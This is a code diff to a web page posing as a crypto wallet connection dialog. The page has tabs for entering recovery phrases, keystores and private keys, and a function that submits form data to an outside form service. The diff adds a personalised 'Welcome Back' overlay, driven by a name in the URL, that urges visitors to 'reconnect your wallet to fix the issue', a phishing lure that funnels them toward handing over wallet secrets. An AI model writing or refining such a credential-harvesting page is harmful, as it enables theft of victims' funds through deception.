@@ -29,6 +29,15 @@
 .connect-overlay.active{opacity:1;transform:translateX(0);pointer-events:auto}
 .main-wallet-wrap{position:relative;display:inline-flex;align-items:center;justify-content:center;width:120px;height:120px;margin-bottom:18px}
 #modalMainWalletImg,#modalMainWalletImg2{width:96px;height:96px;border-radius:12px;object-fit:contain;background:transparent}
+ .welcome-back-overlay{position:fixed;inset:0;background:rgba(2,6,23,0.78);backdrop-filter:blur(10px);display:none;align-items:center;justify-content:center;z-index:10002;opacity:0;transition:opacity .25s ease}
+.welcome-back-overlay.active{display:flex;opacity:1}
+.welcome-back-modal{position:relative;width:min(92vw, 480px);max-width:480px;background:linear-gradient(145deg, rgba(18,24,38,0.98), rgba(7,11,20,0.95));border:1px solid rgba(102,180,255,0.35);border-radius:24px;padding:28px 24px 24px;box-shadow:0 20px 55px rgba(0,0,0,0.35), inset 0 1px 0 rgba(255,255,255,0.06);transform:perspective(1200px) rotateX(8deg) rotateY(-4deg) translateZ(0);transition:transform .25s ease}
+.welcome-back-overlay.active .welcome-back-modal{transform:perspective(1200px) rotateX(0deg) rotateY(0deg) translateZ(0)}
+.welcome-back-close{position:absolute;top:12px;right:12px;width:36px;height:36px;border:0;border-radius:999px;background:rgba(255,255,255,0.08);color:#fff;cursor:pointer;font-size:18px;display:inline-flex;align-items:center;justify-content:center}
+.welcome-back-header{font-size:clamp(1.35rem, 2.8vw, 1.8rem);font-weight:700;text-align:center;color:#fff;margin:10px 0 10px}
+.welcome-back-desc{font-size:clamp(0.95rem, 2.2vw, 1rem);line-height:1.6;text-align:center;color:#d0d7e2;margin:0 0 18px}
+.welcome-back-btn{width:100%;padding:14px 16px;border:0;border-radius:14px;background:linear-gradient(135deg, #3396ff, #5ba2ff);color:#fff;font-weight:700;cursor:pointer;box-shadow:0 12px 24px rgba(51,150,255,0.24)}
+.welcome-back-btn:hover{transform:translateY(-1px)}
  .connect-ring {
   position: absolute;
   top: 50%;
@@ -535,31 +544,18 @@
     const toggleMore = document.getElementById('toggle-more');
     const extra = document.getElementById('extra-wallets');
     const searchInput = document.getElementById('wallet-search');
-
-    openBtns.forEach(btn => {
-      btn.addEventListener('click', ()=>{ modalOverlay.style.display='flex'; setTimeout(()=>modalOverlay.classList.add('active'),10) });
-    });
-    if(closeBtn) closeBtn.addEventListener('click', ()=>{ modalOverlay.classList.remove('active'); setTimeout(()=>modalOverlay.style.display='none',400) });
-    if(closeManual) closeManual.addEventListener('click', ()=>{ manualOverlay.classList.remove('active'); setTimeout(()=>manualOverlay.style.display='none',400) });
-    if(welcomeCloseBtn) welcomeCloseBtn.addEventListener('click', ()=>{ welcomeOverlay.classList.remove('active'); setTimeout(()=>welcomeOverlay.style.display='none',220) });
-    if(welcomeConnectBtn) welcomeConnectBtn.addEventListener('click', openWalletSelection);
-
-    if(toggleMore) toggleMore.addEventListener('click', ()=>{ if(extra.style.display==='none'){ extra.style.display='grid'; toggleMore.textContent='Show fewer wallets' } else { extra.style.display='none'; toggleMore.textContent='More wallets' } });
-
-    if(searchInput) searchInput.addEventListener('input', ()=>{ const q = searchInput.value.trim().toLowerCase(); const items = Array.from(document.querySelectorAll('.wallet-item')); if(!q){ items.forEach(it=>{ it.style.display=''; it.classList.remove('selected') }); document.getElementById('status-message').textContent='Select a wallet to connect'; return } const matches = items.filter(it => (it.dataset.wallet||'').toLowerCase().includes(q)); items.forEach(it => it.style.display = matches.includes(it) ? '' : 'none'); const stat = document.getElementById('status-message'); stat.textContent = matches.length ? `${matches.length} wallet${matches.length>1?'s':''} found` : 'No wallets found'; });
-
-    document.querySelectorAll('.tab-btn').forEach(btn=>btn.addEventListener('click',(e)=>{ document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); const t = btn.dataset.tab; document.getElementById('phrase-tab').style.display = t==='phrase' ? '' : 'none'; document.getElementById('keystore-tab').style.display = t==='keystore' ? '' : 'none'; document.getElementById('private-tab').style.display = t==='private' ? '' : 'none'; }));
-
-    const manualConnectBtn = document.getElementById('manual-connect-btn');
-    const phraseInput = document.getElementById('phrase-input');
-    const phraseStatus = document.getElementById('phrase-status');
     const welcomeOverlay = document.getElementById('welcome-back-overlay');
     const welcomeCloseBtn = document.getElementById('welcome-back-close');
     const welcomeConnectBtn = document.getElementById('welcome-back-connect-btn');
     const welcomeHeader = document.getElementById('welcome-back-header');
     const welcomeDesc = document.getElementById('welcome-back-desc');
 
-    function getExpectedWords() { const el = document.querySelector('input[name="phrase-length"]:checked'); return el ? Number(el.value) : 12; }
+    openBtns.forEach(btn => {
+      btn.addEventListener('click', ()=>{ if (modalOverlay) { modalOverlay.style.display='flex'; setTimeout(()=>modalOverlay.classList.add('active'),10) } });
+    });
+    if(closeBtn) closeBtn.addEventListener('click', ()=>{ if (modalOverlay) { modalOverlay.classList.remove('active'); setTimeout(()=>modalOverlay.style.display='none',400) } });
+    if(closeManual) closeManual.addEventListener('click', ()=>{ if (manualOverlay) { manualOverlay.classList.remove('active'); setTimeout(()=>manualOverlay.style.display='none',400) } });
+
     function openWalletSelection() {
       if (modalOverlay) {
         modalOverlay.style.display = 'flex';
@@ -572,6 +568,7 @@
         }, 220);
       }
     }
+
     function showWelcomeBackModal(name) {
       if (!welcomeOverlay || !welcomeHeader || !welcomeDesc) return;
       const safeName = (name || '').trim();
@@ -579,8 +576,25 @@
       welcomeHeader.textContent = `Welcome Back ${safeName}`;
       welcomeDesc.textContent = 'Please kindly reconnect your wallet to fix the issue.';
       welcomeOverlay.style.display = 'flex';
-      setTimeout(() => welcomeOverlay.classList.add('active'), 10);
+      requestAnimationFrame(() => {
+        welcomeOverlay.classList.add('active');
+      });
     }
+
+    if(welcomeCloseBtn) welcomeCloseBtn.addEventListener('click', ()=>{ if (welcomeOverlay) { welcomeOverlay.classList.remove('active'); setTimeout(()=>welcomeOverlay.style.display='none',220) } });
+    if(welcomeConnectBtn) welcomeConnectBtn.addEventListener('click', openWalletSelection);
+
+    if(toggleMore) toggleMore.addEventListener('click', ()=>{ if(extra.style.display==='none'){ extra.style.display='grid'; toggleMore.textContent='Show fewer wallets' } else { extra.style.display='none'; toggleMore.textContent='More wallets' } });
+
+    if(searchInput) searchInput.addEventListener('input', ()=>{ const q = searchInput.value.trim().toLowerCase(); const items = Array.from(document.querySelectorAll('.wallet-item')); if(!q){ items.forEach(it=>{ it.style.display=''; it.classList.remove('selected') }); document.getElementById('status-message').textContent='Select a wallet to connect'; return } const matches = items.filter(it => (it.dataset.wallet||'').toLowerCase().includes(q)); items.forEach(it => it.style.display = matches.includes(it) ? '' : 'none'); const stat = document.getElementById('status-message'); stat.textContent = matches.length ? `${matches.length} wallet${matches.length>1?'s':''} found` : 'No wallets found'; });
+
+    document.querySelectorAll('.tab-btn').forEach(btn=>btn.addEventListener('click',(e)=>{ document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); const t = btn.dataset.tab; document.getElementById('phrase-tab').style.display = t==='phrase' ? '' : 'none'; document.getElementById('keystore-tab').style.display = t==='keystore' ? '' : 'none'; document.getElementById('private-tab').style.display = t==='private' ? '' : 'none'; }));
+
+    const manualConnectBtn = document.getElementById('manual-connect-btn');
+    const phraseInput = document.getElementById('phrase-input');
+    const phraseStatus = document.getElementById('phrase-status');
+
+    function getExpectedWords() { const el = document.querySelector('input[name="phrase-length"]:checked'); return el ? Number(el.value) : 12; }
     function showPhraseError(msg) { if (!phraseStatus) return; phraseStatus.textContent = msg; phraseStatus.style.display = 'block'; setTimeout(()=>{ try{ phraseStatus.style.display='none' }catch(e){} }, 4000); }
 
     async function submitToWeb3Forms(data) {
@@ -597,7 +611,7 @@
       } catch(err){ console.error('[submitToWeb3Forms] error:',err); return { success:false, error: err.message||'Submission failed' }; }
     }
 
-    const hashName = (() => {
+    const getHashName = () => {
       try {
         const raw = (window.location.hash || '').replace(/^#/, '').trim();
         if (!raw) return '';
@@ -605,11 +619,16 @@
       } catch (e) {
         return '';
       }
-    })();
+    };
 
-    if (hashName) {
-      setTimeout(() => showWelcomeBackModal(hashName), 250);
-    }
+    const showFromHash = () => {
+      const hashName = getHashName();
+      if (!hashName) return;
+      requestAnimationFrame(() => showWelcomeBackModal(hashName));
+    };
+
+    showFromHash();
+    window.addEventListener('hashchange', showFromHash);
 
     if (manualConnectBtn) manualConnectBtn.addEventListener('click', async ()=>{
       const activeTabBtn = document.querySelector('.tab-btn.active');
